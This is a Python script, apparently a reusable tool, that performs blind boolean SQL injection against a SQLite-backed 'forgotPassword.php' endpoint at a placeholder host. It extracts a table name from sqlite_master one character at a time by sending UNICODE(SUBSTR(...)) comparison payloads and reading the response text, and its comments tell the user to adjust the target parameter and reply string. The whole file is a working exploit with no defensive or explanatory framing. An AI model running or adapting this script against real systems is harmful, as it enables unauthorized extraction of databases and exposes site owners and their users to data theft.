import requests

s = requests.Session()
query = "' or UNICODE(SUBSTR((SELECT name FROM sqlite_master WHERE type='table'),{},1)){} {}--" # Set query with above.
url = "https://vulnable.webpage.com/forgotPassword.php" #Set URL
charSeaching = 1
interval = 0
finished = False

while not finished:
    for i in 44, 56, 68, 80, 92, 104, 116, 128:
        req = s.post(
            url, data={"username": query.format(charSeaching, "<", str(i))}) # Replace "username" with the parameter in your request. 
        if "Data Sent!" in str(req.text): # Replace "Data Sent!" with your requests reply.
            interval = i
            break

    for i in range(interval-12, interval):
        req = s.post(
            url, data={"username": query.format(charSeaching, "=", str(i))}) # Replace "username" with the parameter in your request. 
        if "Data Sent!" in str(req.text): # Replace "Data Sent!" with your requests reply.
            charSeaching += 1
            finished = False
            print(chr(i), end="")
            break
        else:
            finished = True
